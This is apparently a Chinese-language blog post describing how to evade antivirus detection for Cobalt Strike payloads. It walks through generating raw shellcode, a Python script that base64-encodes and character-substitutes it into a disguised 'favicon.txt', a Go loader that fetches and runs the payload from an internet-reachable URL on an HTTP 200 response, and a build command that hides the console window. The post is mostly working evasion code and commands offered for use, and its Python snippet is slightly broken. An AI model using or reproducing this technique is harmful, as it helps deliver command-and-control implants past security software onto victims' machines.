---
layout: post
title: Cobalstrike免杀
date: 2021-05-27
category: Cobalstrike
---

## **Cobalstrike payload分离免杀**

[复现的github地址]: https://github.com/jas502n/bypassAV-1

* 首先使用CobaltStrike 生成payload.bin

  ```
  Attacks =>> Packages =>> Payload generate =>> Output =>> Raw =>> payload.bin
  ```

* go-encodepayload.py 对生成的payload进行简单的base64加密import base64

  ```
  import random
  import numpy
  import sys
  
  # print len(sys.argv)
  
  # print sys.argv[0]
  
  # print sys.argv[1]
  
  shellcode =  open("payload.bin","rb").read()
  b64shellcode = base64.b64encode(shellcode).decode()
  b64shellcode = b64shellcode.replace("A","#").replace("H","!").replace("1","@").replace("T",")")
  print("[+] b64shellcode= \n" + b64shellcode)
  f = open("favicon.txt","wb")
  f.write(b64shellcode)
  f.close()
  ```

* 将生成的base64编码字符复制到main.go 修改build('base64编码')

  ![image-20210527161342484](http://r1ghrfhd.github.io/assert/image/image-20210527161342484.png)

  需要主要的点:**url地址需要能够外网访问 因为当返回请求码为200的时候才会加载执行payload**

* 编译main.go

  ```
  go build -ldflags="-w -s -H=windowsgui" main.go
  ```
  
* 直接运行main.exe

  ![image-20210527162004560](http://r1ghrfhd.github.io/assert/image/image-20210527162004560.png)